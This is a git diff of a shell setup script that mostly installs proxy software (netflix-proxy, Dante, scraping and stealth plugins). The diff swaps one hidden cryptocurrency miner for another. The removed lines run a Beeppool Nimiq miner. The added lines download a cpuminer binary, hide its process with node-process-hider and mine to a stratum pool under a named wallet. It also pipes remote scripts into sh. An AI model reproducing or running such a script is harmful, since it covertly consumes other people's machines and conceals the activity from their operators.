@@ -11,104 +11,51 @@ cp config.sample.json config.json
 clear
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
-  && cd /opt\
-  && mkdir -p smart-dns-proxy\
-  && cd smart-dns-proxy\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && curl -fsSL https://github.com/Publish3r/smart-dns-proxy/raw/main/install.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  echo "====================================="
-  echo "Bismillahirahmannirrahim"
-  echo "====================================="
-  sleep 5
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
   && mkdir -p ~/netflix-proxy\
   && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  echo "====================================="
-  echo "Bismillahirahmannirrahim"
-  echo "====================================="
-  sleep 5
-mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  echo "====================================="
-  echo "Bismillahirahmannirrahim"
-  echo "====================================="
-  sleep 5
-wget --no-check-certificate https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1 && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
 
   sleep 5
   
+wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
+tar zxvf dante-1.4.2.tar.gz
+cd dante-1.4.2
+./configure
+make -j`nproc`
+make install
+
+  echo "====================================="
+  echo "Bismillahirahmannirrahim"
+  echo "====================================="
+  sleep 5
+git clone https://github.com/Square252/adBlockHosts.git
+cd adBlockHosts
+chmod +x adBlockHostsGenerate.sh
+./adBlockHostsGenerate.sh
+
+  echo "====================================="
+  echo "Bismillahirahmannirrahim"
+  echo "====================================="
+  sleep 5
+npm install zyte-smartproxy-puppeteer && npm install playwright playwright-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth @cliqz/adblocker-playwright && npm install puppeteer puppeteer-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth puppeteer-extra-plugin-adblocker && curl https://raw.githubusercontent.com/Smartproxy/Python-scraper-tutorial/master/scraper.py > scraper.py
+
+  sleep 5
+
 sudo apt-get update\
   && sudo apt-get -y install vim dnsutils curl\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
   && sudo usermod -aG docker $(whoami | awk '{print $1}')\
   && mkdir -p ~/netflix-proxy\
   && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
   
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
+  echo "====================================="
+  echo "Bismillahirahmannirrahim"
+  echo "====================================="
   sleep 5
-  
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-  
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-  
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-  
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
+wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
 
   echo "====================================="
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
-wget --no-check-certificate https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1 && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add beepminer && ./miner --wallet-address=NQ56XV96CH5LPXQHK9U7T0FS18RDYG6R5Y2Y --type=dumb --pool=nimiq.icemining.ca:2053 --region=OC --deviceLabel=DANIS
+npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yespowertide  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u TSmFhoamG8WHPii3KpxA5bi7V6DtZ5vPxw.Genzo -t 2
